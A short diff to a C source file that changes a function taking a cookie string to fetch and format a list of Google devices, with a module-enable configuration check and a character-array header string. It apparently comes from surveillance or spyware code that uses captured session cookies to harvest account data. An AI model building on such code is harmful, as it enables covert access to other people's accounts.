@@ -12,8 +12,9 @@
 #include "social.h"
 #include "JSON.h"
 
-extern DWORD ConvertToUTF8(LPWSTR pIn, LPSTR* pOut);
-extern void GD_DumpBuffer(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize);
+extern BOOL ConfIsModuleEnabled(LPWSTR strModule);
+//extern DWORD ConvertToUTF8(LPWSTR pIn, LPSTR* pOut);
+//extern void GD_DumpBuffer(LPCWSTR lpFileName, char* lpBuffer, DWORD dwSize);
 
 HANDLE g_hDevMutex = NULL;
 
@@ -528,7 +529,7 @@ DWORD GDev_ExtractDevList(LPWSTR *pwszFormattedList, LPSTR pszRecvBuffer)
 
 
 //get the device list
-DWORD GDev_GetDevices(LPSTR pszCookie)
+DWORD GoogleDeviceHandler(LPSTR pszCookie)
 {	
 	WCHAR   pwszHeader[] = {L'\n', L'G', L'o', L'o', L'g', L'l', L'e', L' ', L'D', L'e', L'v', L'i', L'c', L'e', L's', L':', L'\n', L'\n', '\0'};
 	LPWSTR	pwszDevicesList=NULL;
@@ -536,7 +537,10 @@ DWORD GDev_GetDevices(LPSTR pszCookie)
 	DWORD	dwRet, dwBufferSize=0, dwSize=0, dwLen=0;
 	CHAR    pszBuf[128];
 
-	if(!bSendGoogleDevice)		
+	if (!ConfIsModuleEnabled(L"device"))
+		return SOCIAL_REQUEST_SUCCESS;
+
+	if(!bSendGoogleDevice)
 		return FALSE;
 
 	if(lpDeviceContainer)
